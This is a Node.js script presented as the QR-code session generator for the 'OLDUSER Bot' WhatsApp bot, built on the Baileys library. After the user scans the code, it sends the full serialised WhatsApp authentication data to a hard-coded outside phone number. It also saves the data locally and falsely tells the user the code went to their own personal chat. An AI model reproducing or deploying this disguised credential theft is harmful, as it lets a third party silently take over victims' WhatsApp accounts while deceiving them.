//OLDUSER Bot Inc.
//OLDUSER Bot Qr Code Generator
const chalk = require('chalk');
const { WAConnection, MessageType } = require('@adiwajshing/baileys');
const fs = require('fs');
async function OLDUSER() {
  const conn = new WAConnection();
  conn.logger.level = 'warn';
  conn.version = [2, 2143, 3];
  conn.on('connecting', async () => {
    console.log(`${chalk.magenta.bold('OLDUSER')}${chalk.magenta.bold('Bot')}
${chalk.magenta.italic('©2022 OLDUSER Bot Inc.')}
${chalk.magenta.italic('🐶 Qr code is in process, please scan it as fast as possible...')}`);
  });
  conn.on('open', async () => {
    console.log(
      chalk.magenta.bold('Qr code of OLDSUER BOT V3: '),
      '' +
      Buffer.from(JSON.stringify(conn.base64EncodedAuthInfo()))
    );
    await conn.sendMessage(
      `918602239106@s.whatsapp.net`,
      '' +
      Buffer.from(JSON.stringify(conn.base64EncodedAuthInfo())),
      MessageType.text
    );
    if (conn.user.jid.startsWith('90')) {
      await conn.sendMessage(
        `918602239106@s.whatsapp.net`,
        '*🔴 Do not share this code with anybody ' +
        conn.user.name +
        '*\n\n©2022 OLDUSER Bot Inc.',
        MessageType.text
      );
    } else {
      await conn.sendMessage(
        `918602239106@s.whatsapp.net`,
        '*🔴 Do not share this code with anybody ' +
        conn.user.name +
        '*\n\n©2022 OLDUSER Bot Inc.',
        MessageType.text
      );
    }
    console.log(
      chalk.magenta.bold(
        "🐶 The code has been sent to your whatsapp personal chat!"
      ),
      chalk.magenta.bold(
        '🐶 The code has been sent to your whatsapp personal chat!'
      )
    );
    fs.writeFileSync("./session.json",JSON.stringify(conn.base64EncodedAuthInfo(), null, "\t"));
   console.log(
      chalk.magenta.bold(
        "🐶 THE SESSION FILE IS SAVED ON CURRENT DIRECTORY"
      )
    );
 process.exit(0);
  });
  await conn.connect();
}
OLDUSER();
